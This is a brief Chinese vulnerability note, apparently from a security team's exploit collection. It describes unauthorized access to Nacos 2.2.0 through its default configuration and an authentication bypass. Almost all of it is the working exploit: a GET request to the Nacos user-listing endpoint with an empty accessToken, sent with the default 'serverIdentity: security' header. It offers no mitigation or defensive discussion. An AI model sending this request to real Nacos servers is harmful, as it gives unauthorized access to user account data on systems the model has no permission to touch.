# Nacos默认配置未授权访问漏洞和2.2.0绕过

> **Created by：** A-little-dragon
>
> **Team：** TracelessSec
>
> **漏洞描述：** Nacos默认配置未授权访问漏洞和2.2.0绕过



# **0x01 影响版本**

```
Nacos2.2.0
```

# **0x02 漏洞复现**

```
//GET请求
127.0.0.1:8848/nacos/v1/auth/users?pageNo=1&pageSize=9&search=accurate&accessToken

//设置请求头
serverIdentity: security
```

![Untitled](image/Untitled.png)